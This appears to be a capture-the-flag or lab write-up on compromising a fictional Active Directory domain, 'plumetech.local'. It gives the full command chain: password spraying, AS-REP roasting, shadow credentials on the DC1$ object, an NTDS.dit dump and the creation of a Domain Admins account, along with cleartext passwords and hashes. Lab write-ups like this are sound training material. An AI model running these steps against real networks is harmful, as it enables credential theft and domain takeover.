# Writeup:

Navigating the fileserver web page at `http://10.0.3.12`, we discovered multiple domain users.

```
info@plumetech.local
Chief Executive Officer vicky@plumetech.local  
Chief Technical Officer ramon@plumetech.local  
Head of Security Operations lorenzo@plumetech.local 
Director of Operations beth@plumetech.local
```

From there, we issued a password spray that led to the discovery of lorenzo's password.

```
PLUMETECH.LOCAL\lorenzo:q1w2e3r4t5
```

From there, ASREProasting was performed to obtain a crackable hash of the user ramon, who has generic all on the IT DC1.

```
nxc ldap 10.0.3.11 -u lorenzo -p q1w2e3r4t5 --asreproast output.txt
```

Once the hash was obtained, it was then cracked using hashcat.

```
$krb5asrep$23$ramon:7noentras7
```

With the password obtained, we were able to abuse the privileges owned by ramon to create a shadow credential on the DC1$ user object to then use it to impersonate any domain user on the DC.

```
└─$ python3 PKINITtools/gettgtpkinit.py -cert-pfx dc1_shadow.pfx -pfx-pass password 'PLUMETECH.LOCAL/dc1$' dc1_shadow.ccache
```

From there, obtain the NT Hash of the DC1$ object.

```
python3 PKINITtools/getnthash.py -key 8a0e1c591daaf16f778345af7a182dbd1c1abd937cdc7211ab07c3b65610a5fc 'PLUMETECH.LOCAL/dc1$'
```

```
[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash      
5b785f74eac4446875c4fb3832a1e650
```

NTDS.dit dump through s4u2self.

```
nxc smb 10.0.3.11 -d 'PLUMETECH.LOCAL' -u 'DC1$' -H bed9fe4af293d3ce446c731dd2744abb --delegate "Administrator" --self --ntds --users marty
```

The last thing needed was to add the user to domain admins.

```
nxc smb 10.0.3.11 -d 'PLUMETECH.LOCAL' -u 'marty' -H 3824065b9bcdc9fc9b6f98c5fa7d7fdc -x 'net user /add plumber password /domain && net group "Domain Admins" plumber /add /domain
```